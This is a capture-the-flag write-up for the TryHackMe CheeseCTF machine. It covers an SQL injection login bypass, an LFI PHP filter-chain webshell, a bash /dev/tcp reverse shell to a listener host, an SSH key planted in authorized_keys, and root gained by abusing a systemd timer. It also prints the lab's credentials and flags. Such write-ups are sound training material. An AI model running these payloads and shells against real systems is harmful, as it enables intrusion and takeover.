# TryHackMe — CheeseCTF Writeup

**Difficulty:** Easy  
**OS:** Linux  
**Author:** Abdelilah (cat0x01)  

---

## Reconnaissance

```bash
nmap -sS -sV -Pn 10.129.135.223 -p- -T4
```

Found port 80 running Apache 2.4.41.

---

## SQL Injection — Login Bypass

Navigated to the login page and bypassed authentication with:
Username: ' || '1'='1';-- -
Password: anything

Redirected to `supersecretadminpanel.html`.

---

## Source Code Disclosure via LFI + PHP Filter

Found LFI in `secret-script.php?file=`. Read source files using base64 wrapper:

```bash
?file=php://filter/convert.base64-encode/resource=/var/www/html/login.php
```

Decoded and found plaintext DB credentials:

- User: `comte`
- Password: `VeryCheesyPassword`

---

## LFI to RCE — PHP Filter Chain

Generated a webshell using php_filter_chain_generator:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)
```

Confirmed RCE:

```bash
curl -g -s "http://10.129.135.223/secret-script.php?file=${CHAIN}&cmd=id"
# uid=33(www-data)
```

---

## Reverse Shell

```bash
nc -lvnp 4444
curl -g -s "http://10.129.135.223/secret-script.php?file=${CHAIN}&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.134.120/4444+0>%261'"
```

Got shell as `www-data`.

---

## User Flag — SSH Key Write

From the `www-data` shell, wrote SSH public key to comte's authorized_keys:

```bash
echo "YOUR_PUBKEY" > /home/comte/.ssh/authorized_keys
```

SSH'd in:

```bash
ssh -i ~/comte_key comte@10.129.135.223
cat user.txt
```
THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}

---

## Privilege Escalation — Systemd Timer Abuse

```bash
sudo -l
# (ALL) NOPASSWD: /bin/systemctl daemon-reload
# (ALL) NOPASSWD: /bin/systemctl start exploit.timer
```

Checked `/etc/systemd/system/exploit.service`:
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"

The timer file had `OnBootSec=` empty — fixed it with nano, then triggered:

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start exploit.timer
```

`/opt/xxd` now had SUID bit. Read root flag:

```bash
/opt/xxd /root/root.txt | xxd -r
```
THM{dca75486094810807faf4b7b0a929b11e5e0167c}

---

## Lessons Learned

- Always read source files via LFI — credentials hide in plain sight
- PHP filter chains bypass most LFI restrictions for RCE
- Reverse shell beats URL encoding fights every time
- Writable systemd unit files + sudo = easy root

---

## Summary

| Field | Value |
|-------|-------|
| Initial access | SQL injection login bypass |
| Enumeration | LFI + PHP filter base64 source disclosure |
| RCE | PHP filter chain webshell |
| Lateral movement | SSH key write to comte's authorized_keys |
| Privilege escalation | Systemd timer abuse + SUID xxd |
| User flag | `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}` |
| Root flag | `THM{dca75486094810807faf4b7b0a929b11e5e0167c}` |
